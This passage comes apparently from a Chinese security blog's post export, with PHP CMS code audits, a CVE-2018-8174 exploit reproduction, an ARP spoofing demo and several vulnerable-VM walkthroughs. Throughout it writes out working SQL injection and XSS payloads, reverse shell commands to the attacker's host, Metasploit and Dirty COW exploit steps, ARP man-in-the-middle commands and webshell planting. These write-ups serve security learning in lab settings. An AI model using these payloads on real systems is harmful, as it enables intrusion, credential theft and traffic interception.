审计工具使用rips扫描得出可能存在96个漏洞；[3]并且还给出了解释和如何去利用；[4]rips功能很强大，可以掌握一下使用方法； 用seay源代码审计系统扫描得出可能存在34个漏洞；[5] 任意文件包含漏洞查看第一个可疑漏洞，是一个文件包含，index.php代码如下： 在根目录下建立一个phpinfo.php，内容就是&lt;?php phpinfo(); ?&gt;，利用该漏洞进行包含，包含成功（文件名后面自动拼接.php）；[6]第二个可疑漏洞利用方式也一样； sql注入看看登录页面，盲猜用户名和密码为admin、admin竟然登上了。。。[7]还是来看一下代码/admin/files/login.php： 这里用POST传递参数，user和password没有经过任何过滤就直接带进了数据库查询；如果用户名不存在，就报错；用户名存在，就进行验证密码是否正确；这里会将我们输入的密码进行md5编码，然后再与数据库中正确密码进行比较。所以这里没法用万能密码了，但是可以用报错注入；用户名后加个单引号，会出现报错信息；[8]尝试构造payload，发现一次注入只能回显出一部分密码md5值，所以要分两次注入，再拼接到一起，payload为：admin&#39; or updatexml(1,concat((select concat(0x7e,password) from manage)),0) #admin&#39; or updatexml(1,concat((select concat(password,0x7e) from manage)),0) #拼接后为21232f297a57a5a743894a0e4a801fc3，解码得到正确密码；[9] admin/files/editlink.php也存在同样原理的漏洞，参数没有经过过滤就带入了数据库查询； 仍然是用报错注入再进行拼接，payload如下：&#39; or updatexml(1,concat((select concat(0x7e,password) from manage)),0) or &#39;&#39; or updatexml(1,concat((select concat(password,0x7e) from manage)),0) or &#39; XSS漏洞 反射型 以/files/contact.php为例，问题代码为$page=addslashes($_GET[&#39;page&#39;]);，addslashes()只过滤了&#39;``&quot;``\\``NULL，仍然可以执行xss命令； [10] 存储型 以/files/contact.php为例，问题代码为 这里是提交表单信息，将写入的评论存入$content变量然后发送到sunbmit.php中进行处理，对name、mail、url都没有进行过滤； 进行留言和回复留言，内容如图； [11] XSS代码已经存进去了，只要有人访问留言页面，就会出现弹框； [12] [13] 垂直越权inc&#x2F;checklogin.php，代码如下： 以admin/?r=newlink为例，在未登录的情况下访问抓包，在cookie处添加user=admin，即不让user为空，发送之后则登录成功，完全不用密码；[14] CSRF漏洞在内容管理模块中，有一个删除文章的功能，点击删除文章时用burp抓包会得到一个链接，意思是删除id为9的文章；[15]如果管理员点击这个链接的话，会让管理员先登录账号，然后会发现，id为9的文章已经被删掉了；[16] 参考链接："},{"title":"bluecms v1.6 sp1代码审计","date":"2022-09-18T07:16:30.000Z","url":"/2022/09/18/bluecms%20v1.6%20sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","categories":[[" ",""]],"content":"环境搭建下载bulecms v1.6的源码：放入根目录下后访问install进行安装； 第一次安装好像没安装对，又访问了一次install再次进行安装；欸，等等，又可以重新安装一次，那不是人人都可以访问install，每次把所有数据进行重装一次。。 审计过程网站目录结构[1] 工具扫描seay源代码审计系统扫描出255个可疑漏洞；[2] SQL注入&#x2F;uploads&#x2F;ad_js.php $ad_id变量无单引号保护，只用trim()去除了首位的空格，可以进行注入，是数字型，payload如下：查数据库名：ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()[3]查表名：ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()查出来的表名要转换为16进制才能进一步查列名；将blue_admin转换为16进制0x626c75655f61646d696e，查询；group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e接着查询用户名admin_name和密码pwd；ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x7e,pwd) from blue_admin密码经过md5加密的，解密一下就好了；[4] 有的cms审着审着主页就没了（被旁边的hacker删掉了(╯‵□′)╯︵┻━┻），不过这个免杀马我就收下了(๑‾ ꇴ ‾๑)，不亏；[5] &#x2F;uploads&#x2F;include&#x2F;common.fun.php(XFF注入)扫描结果说获取IP地址方式可伪造，HTTP_REFERER可伪造；[6]问题代码如下： 这里定义了getip()函数，$ip的值可能从HTTP_CLIENT_IP HTTP_X_FORWARDED_FOR HTTP_FORWARDED_FOR HTTP_FORWARDED获得；全局搜索到有两个地方调用了这个函数；[7]查看文件/uploads/include/common.inc.php，代码如下： 将getip()获得的值给了 $online_ip，搜索一下哪里用了$online_ip；[8]查看guest_book.php，代码如下： $online_ip得到的值没有经过过滤就带入sql语句执行，所以这里，是存在注入的；访问/uploads/guest_book.php，是一个留言界面，可是无论填写什么内容，发表时都提示留言内容不能为空，用burp抓包也抓不到；那这多半就是个前端js验证，改改代码就可以了；[9]然后发表留言，用burp抓包，添加一个XFF头，在XFF头进行注入，要对语句进行闭合，payload如下：X-Forwarded-For: 127.0.0.1&#39;,database()) -- +[10]评论区爆出数据库名，继续查询可得更多信息。 &#x2F;uploads&#x2F;admin&#x2F;login.php(宽字节注入)问题代码： 追踪check_admin到/uploads/admin/include/common.fun.php； 如果在magic_quotes_gpc=Off的情况下，所有传入的参数都会经过deep_addslashes()函数； 追踪deep_addslashes()函数到/uploads/admin/include/common.fun.php； 作用是将传入的参数用addslashes()函数进行过滤；如果在magic_quotes_gpc=On的情况下，单引号、双引号、反斜线与 NULL等字符也都会被转义掉，和addslashes()函数作用一样；所以，无论什么情况，传入的参数都会被转义，而从前面的抓包信息可以看到是gbk2312编码；[11]所以这里存在宽字节注入，可以用万能密码进行登录；xx%df&#39; or 1=1 #[12] XSS漏洞&#x2F;uploads&#x2F;user.php注册一个新用户，提交抓包；[13]显示出了我们填写的所以信息，act参数是控制执行什么功能，查看源码，找到$act == &#39;do_reg&#39;，代码如下： 这里对用户名和密码的长度进行了限制，而对$emali只有trim()函数作用，所以在$emali处存在存储型XSS，为了绕过前端检测，用burp抓包写入payload；[14] &#x2F;uploads&#x2F;user.php $content内容经过了filter_data()函数过滤，追踪该函数到/uploads/include/common.fun.php第985行； 这个函数将许多字符都替换成了空，但是还有img标签没过滤，构造payload&lt;img src=1 onerror=alert(/blckder02/)&gt;，$cid不能为空，就随便给个值；[15] 文件包含&#x2F;upoads&#x2F;user.php742行 $_POST[&#39;pay&#39;]前后加了文件，可以使用../进行目录遍历，后面的/index.php如果php版本低于5.3.4且magic_quotes_gpc=off则可以使用%00截断，导致任意文件包含。还可以使用.....号进行长路径截断，Windows下目录最大长度为256字节，Linux下目录最大长度为4096字节； 道理是这样没错，但是我始终包含不上，放弃(ー ー゛)。 可以在用户头像上传图片马包含来getshell；[16] 任意文件删除&#x2F;uploads&#x2F;user.php779行 如果face_pic1为空，又存在face_pic3的话，就删除face_pic3，那传给face_pic3的任意文件都可以删除；新建一个1.txt；[17]提交修改信息抓包，保证face_pic1为空，在face_pic3处写入1.php，发送成功，1.php被删除；[18] &#x2F;uploads&#x2F;user.php615行 该段代码的功能是在编辑信息时，如果存在$_POST[&#39;lit_pic&#39;]上传的文件，那么就删除该文件；先随便发布一篇信息；[19]点击编辑，然后提交信息抓包，lit_pic默认的值是空；[20]在新建一个2.php；[21]令lit_pic=2.php，发送，2.php被删除；[22] 大致漏洞类型是这些，用个别地方举了下例子，还有其他很多地方漏洞原理差不多，有时间慢慢研究。"},{"title":"IE浏览器远程代码执行漏洞（CVE-2018-8174）","date":"2022-09-17T07:29:31.000Z","url":"/2022/09/17/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8174%EF%BC%89/","categories":[[" ",""]],"content":"漏洞简介利用浏览器0day漏洞的新型Office文档攻击，该漏洞被命名为“双杀”漏洞。该漏洞影响部分版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑。 影响范围 环境搭建Kali Linux：192.168.43.143win 7虚拟机：192.168.43.58 漏洞复现使用metasploit 获取会话下载 metasploit 模块到kali虚拟机；git clone 将CVE-2018-8174.rb复制到 fileformat 目录；cp CVE-2018-8174.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/注意要把文件名中的-改成_，mv CVE-2018-8174.rb cve_2018_8174.rb；[1]将CVE-2018-8174.rtf复制到 exploits 目录；cp CVE-2018-8174.rtf /usr/share/metasploit-framework/data/exploits/启动metasploit，设置参数； 启动端口监听，在win 7上用IE浏览器打开，即可获得会话；[2] 使用CVE-2018-8174_EXP获取shell使用CVE-2018-8174_EXP进行建立连接，下载：进入CVE-2018-8174_EXP目录，运行CVE-2018-8174.py，生成带有恶意 VBscript 的 html 页面和msf.rtf文档；python CVE-2018-8174.py -u 192.168.43.143/exploit.html -o msf.rtf -i 192.168.43.143 -p 4444 -u：URL 地址 -o：生成文档 -i：监听地址 -p：监听端口 把exploit.html复制到/var/www/html目录下：cp exploit.html /var/www/html开启apache服务，就可以通过网页来访问这个页面：service apache2 start[3]用nc监听4444端口，在win 7虚拟机上用IE浏览器访问上就可以拿到shell，我这里就是管理员权限；[4] 提权提成system权限，先用Metasploit把command shell转为meterpreter shell； 在win 7上用浏览器访问上即可收到反弹的shell，这是一个普通shell；[5]执行下列命令转换； 获得meterpreter shell；[6]后续还可以利用mf17_010提升至system权限，但是我的win 7好像打了补丁，利用不了，感兴趣的可以在网上查看其他师傅的文章； 参考连接："},{"title":"记一次ARP欺骗断网攻击和中间人攻击","date":"2022-09-17T07:29:30.000Z","url":"/2022/09/17/%E8%AE%B0%E4%B8%80%E6%AC%A1ARP%E6%AC%BA%E9%AA%97%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/","categories":[[" ",""]],"content":"预备知识什么是网关网关工作在OSI七层模型中的传输层或者应用层，用于高层协议的不同网络之间的连接，简单地说，网关就好比是一个房间通向另一个房间的一扇门。 ARP协议地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。 ARP欺骗原理ARP欺骗有两种攻击利用方式 ARP欺骗断网攻击攻击者欺骗受害主机，发送数据告诉受害主机说我是网关，然后受害主机会将攻击主机当作网关进行数据传输，这样就会导致受害主机无法正常上网。 ARP中间人攻击攻击主机欺骗受害主机，发送数据告诉受害主机说我是网关，然后受害主机会将攻击主机当作网关进行数据传输。同时发送数据告诉网关说我是受害主机，网关会将攻击主机当作受害主机进行数据传输，这样受害主机和网关之间的数据交互都会经过攻击主机，受害主机不会断网不会察觉，所以可以查看到各种通信数据。 测试环境攻击机kali linux：192.168.1.106受害机win 10：192.168.1.103 断网演示用nmap扫描和你连同一个wifi下的所有存活主机ip；[1]在受害机上可以执行arp -a查看到攻击机和网关的物理地址不同；[2]此时受害机能正常上网；[3]接下来开始欺骗，在kali上执行命令，告诉受害机，我是网关：arpspoof -i eth0 -t 192.168.1.103 192.168.1.1 与网络有关的 -i 网卡 eth0 目标 -t 目标IP：192.168.1.103 目标主机网关：192.168.1.1 [4]开始了arp欺骗，在受害机上再ping，出现请求超时，说明受害机已经被断网啦；[5]再在受害机上看一下物理地址，发现攻击机和网关的物理地址相同，说明受害机已经把攻击机当成了网关；[6] 在kali中按ctrl+c即可中断欺骗，受害机就可以正常上网了。 ARP中间人攻击仅仅是断网当然没什么用处，能获取到受害机的敏感信息才有用处；将受害机的IP流量进行转发，黑客就可以利用ARP欺骗可以窃取用户敏感信息、挂马等；需要将kali中&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward里的值由0改为1，即可开启路由转发功能；执行命令echo 1 &gt; /proc/sys/net/ipv4/ip_forward[7]如何然后开始欺骗；[8]打开wireshark可以抓到受害机的流量；[9]可查看受害机访问url地址的信息urlsnarf -i eth0；还可以用driftnet工具抓捕浏览页面的图片dirftnet -i eth0； 如何防范ARP欺骗 将网关IP与物理地址设为静态（默认为动态） 执行arp -s 网关IP 网关物理地址； 使用ARP防火墙 "},{"title":"DC-5靶机渗透","date":"2022-09-17T07:28:30.000Z","url":"/2022/09/17/DC-5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","categories":[[" ",""]],"content":"测试环境kali Linux：192.168.43.23DC-5靶机：192.168.43.45 信息收集 确定靶机IP 用nmap扫描该网段存活的主机 nmap -sP 192.168.43.1/24[1] 其中192.168.43.45就是靶机的IP。 确定靶机开放的端口 使用命令 nmap -sV 192.168.43.45[2] 扫出来可以看到开放了80端口，访问一下；[3] 渗透过程尝试发现在Contact模块提交内容会跳转到thankyou.php，并且这个页面每刷新一次，下方的年份就会变换一次；[4]然后扫一下网站目录，发现有一个footer.php，也是每刷新一次，年份就变换一次；[5]猜测thankyou.php和footer.php有关联，于是想到可能是thankyou.php包含了footer.php；验证一下，随便在thankyou.php中包含个东西，发现下面的年份栏消失了；[6]说明thankyou.php确实存在文件包含漏洞，那么想想该如何利用这个漏洞；通过报错可以发现，该web服务器是nginx服务；[7]在网站上的每一步操作都会被记录进日志文件，在网上查一下nginx服务下的日志文件路径为/var/log/nginx/access.log，还有一个记录错误访问的日志文件路径为/var/log/nginx/error.log，访问失败的内容都记录在里面；在thankyou.php里面传入&lt;?php phpinfo();?&gt;，包含error.log查看发现尖括号被编码了；[8]重新上传，用burp抓包把尖括号改回来；[9]再次包含error.log，成功执行phpinfo()；[10]既然这样，那就写个一句话进去；[11]用菜刀连接即可；[12]后续提权方法比较少见，我这里就不提权了，想继续提权请参考网上其他师傅的文章。"},{"title":"DC-3靶机渗透","date":"2022-09-17T07:27:30.000Z","url":"/2022/09/17/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","categories":[[" ",""]],"content":"测试环境kali Linux：192.168.93.133DC-3靶机：192.168.93.135 信息收集 确定靶机IP 将靶机的网络模式设置成NAT模式，与攻击机处于同一网段下； 用nmap扫描该网段存活的主机 nmap -sP 192.168.93.1/24[1] 其中192.168.93.135就是靶机的IP。 确定靶机开放的端口 使用命令 nmap -sV 192.168.93.135[2] 扫出来可以看到开放了80端口；进入80端口查看，有提示，说是这个靶机只有一个入口点，让我们成为root用户；[3] 渗透过程扫描目录得到后台登录界面是administrator，进入查看发现是joomla系统；[4]用joomscan扫描网站，joomscan -u ，得到joomla版本信息；[5]用searchsploit查找一下有哪些可利用的漏洞，发现一个SQL注入漏洞；[6]42033.txt中提示了用sqlmap去跑；[7]跑出来得到数据库；[8]进入joomladb数据库#_users表里查到admin账号和hash加密后的密码；[9]用John暴力破解得到明文密码是snoopy；[10]从administrator页面登录进入后台；[11]新建一个文件，或者在已存在的文件中写入一句话，我这里在index.php中写入；[12]然后用蚁剑连接，路径为；[13]这里我们最好反弹一个shell到kali上；在kali上开启监听，打开蚁剑虚拟终端，这里是sh环境，执行sh反弹命令；/bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/192.168.93.134/1111 0&gt;&amp;1&#39;（这个靶机拖了几天才打完所以kaliIP变了orz）；[14][15]或者执行ascmd /bin/bash，切换为bash环境，执行bash反弹命令；bash -i &gt;&amp; /dev/tcp/192.168.93.134/4444 0&gt;&amp;[16][17]查看一下内核版本uname -a，经网上搜索，这是Ubuntu 16.04版本；[18]用searchsploit搜索一下这个版本有哪些可利用的漏洞；[19]查看一下所选漏洞的详情，该文件底部有攻击脚本下载路径；cat /usr/share/exploitdb/exploits/linux/local/39772.txt[20]下载该脚本到/var/tmp路径；wget  /var/tmp我这里出了点问题，无法这样直接下载，于是我把这个文件拖到我主机上，通过蚁剑上传到靶机/var/tmp目录下，如何再在kali上逐步解压和选择文件；[21]执行这个文件后便可得到root权限，flag就在root目录下；[22]渗透完毕。 参考连接："},{"title":"DC-2靶机渗透","date":"2022-09-17T07:26:30.000Z","url":"/2022/09/17/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","categories":[[" ",""]],"content":"测试环境kali Linux：192.168.93.129DC-1靶机：192.168.93.132 信息收集 确定靶机IP 将靶机的网络模式设置成NAT模式，与攻击机处于同一网段下； 用nmap扫描该网段存活的主机 nmap -sP 192.168.93.1/24[1] 其中192.168.93.132就是靶机的IP。 确定靶机开放的端口 使用命令 nmap 192.16893.132 -p-[2] 扫出来可以看到开放了80、7744端口； 直接进入80端口的话是无法访问服务器的，这里需要进行域名解析，将靶机IP添入hosts文件；hosts文件路径： Linux：/etc/hosts windows：C:\\Windows\\System32\\drivers\\etc[3][4]再次访问80端口，得到flag1，根据提示需要用cewl爬密码；[5]执行cewl -w password.txt ，-w是将密码写入到password.txt中；[6]80页面的下方有Proudly powered by WordPress 字样，可以用专门针对wordpress的工具wpscan来扫描所有用户，wpscan --url  --enumerate u；[7]然后用之前的密码进行爆破，wpscan --url  -P password.txt，得到jerry和tom两个用户的密码；[8]登录jerry账户，找到flag2；tom账户里没什么有用信息；[9]尝试用这两个账户和密码登录ssh，jerry账户密码不对，只能登上tom账户；[10]登上后，发现有一个flag3.txt，但是这里无法用cat查看flag3.txt，但是可以用vi来查看；[11]这里面提到jerry，那我们切换到jerry的账户看看；执行命令： 用前面爆破出来的密码进行登录，登录成功后切换到jerry目录下，有一个flag4.txt文件； [12] 根据flag4提示，要用git提权，sudo git -p help； [13] 在末尾输入!/bin/bash，便提至了root权限，查看root目录下的final-flag.txt，拿到最后一个flag； [14] 渗透完毕。 "},{"title":"DC-1靶机渗透","date":"2022-09-17T07:25:30.000Z","url":"/2022/09/17/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","categories":[[" ",""]],"content":"测试环境kali Linux：192.168.93.129DC-1靶机：192.168.93.131 信息收集 确定靶机IP 将靶机的网络模式设置成NAT模式，与攻击机处于同一网段下； 用nmap扫描该网段存活的主机 nmap -sP 192.168.93.1/24[1] 其中192.168.93.131就是靶机的IP。 确定靶机开放的端口 使用命令 nmap -sV 192.16893.131[2] 扫出来可以看到开放了22、80、111端口；进入80端口查看，是一个登录页面；[3] 该页面的下方有Powered by Drupal字样，刚好低版本的Drupal存在漏洞； 确定漏洞类型 再用whatweb 查询一下，该靶机是Drupal 7版本，网上一搜，该版本存在远程代码执行漏洞。 [4] 拿shell 用msfconsole查询一下有哪些可利用的模块 sesrch Drupal，选择如图模块； [5] 依次用以下命令设置好参数； 然后开始攻击，并且拿到shell；[6]执行python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;，将shell改为交互的shell[7] 拿falg拿到shell后查看目录，发现有一个flag1.txt，打开得到第一个flag；[8] 根据这个flag说每个CMS都有一个配置文件，则查看一下配置文件，在/var/www/sites/default/settings.php里发现flag2和数据库信息；[9]登陆数据库：mysql -u dbuser -p[10]依次执行下列命令，得到所有用户信息； [11]这些密码是经过某种方式加密的，在网上找得在这种加密方式下，admin加密后的结果是$SSDsDoW7i0xsaf7uH.672g4ccsEX0hzq3q 1W/UOEmff5v.fRbXRuKr，尝试修改admin的密码；update users set pass =&quot;$SSDsDoW7i0xsaf7uH.672g4ccsEX0hzq3q 1W/UOEmff5v.fRbXRuKr &quot; where uid=1;[14]修改成功后，进入80端口网页进行登录，用户名admin，密码admin，然后找到flag3；[15] 直接进入home目录查看，发现有一个flag4文件里有一个flag.txt，打开便得到flag4；[13] 提权根据flag3和flag4的提示，知道这里需要用suid提权；用find命令查看suid可执行的文件；[16]经命令测试，发现为root权限，然后提权； [17]进入root目录，找到thefinalflag.txt，渗透完毕；[18]"},{"title":"Lampiao靶机渗透","date":"2022-09-17T07:24:30.000Z","url":"/2022/09/17/Lampiao%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","categories":[[" ",""]],"content":"测试环境攻击机：kali Linux 192.168.1.6Lampiao靶机：192.168.1.7 信息收集 确定靶机IP 将靶机的网络模式设置成NAT模式，与攻击机处于同一网段下； 用nmap扫描该网段存活的主机 nmap -sP 192.18.1.1/24 [1] 其中192.168.1.7就是靶机的IP。 确定靶机开放的端口 使用命令 nmap 192.168.1.7 -p- [2] 扫出来可以看到开放了80、1898端口；（讲道理还有22端口，不知道为什么没扫出，不重要） 80端口进去是一个有奇怪图形的网页，似乎没什么用； 1898端口进去则是一个登录界面； [3] 该页面的下方有Powered by Drupal字样，刚好低版本的Drupal存在漏洞； 确定漏洞类型 再用whatweb 查询一下，该靶机是Drupal 7版本，网上一搜，该版本存在远程代码执行漏洞。 [4] 拿shell 用msfconsole查询一下有哪些可利用的模块 sesrch Drupal，选择如图模块； [5] 依次用以下命令设置好参数； 然后开始攻击，并且拿到shell；[6]执行python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;，将shell改为交互的shell [7] 拿数据库 拿到shell后，可以查看网站目录里有哪些敏感文件，cat sites/default/settings.php，发现了数据库的账号和密码； [8] 执行命令mysql -u drupaluser -p，输入密码，成功登录数据库； [9] 依次执行下列命令，得到所有用户信息； [10] 提权查看内核版本：uname -a[11]这里要用到一个叫searchsploit工具，尝试脏牛提权searchsploit dirty；[12]这些脚本的路径为/usr/share/exploitdb/exploits/复制该脚本到/root目录 cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /root[13]上传脚本 upload /root/40847.cpp /var/www/html[14]进行编译 g++ -Wall -pedantic -o2 -std=c++11 -pthread -o dcow 40847.cpp -lutil；编译成功后./dcow -s执行；[15]提权成功。查看flag.txt，得到flag；[16]"}]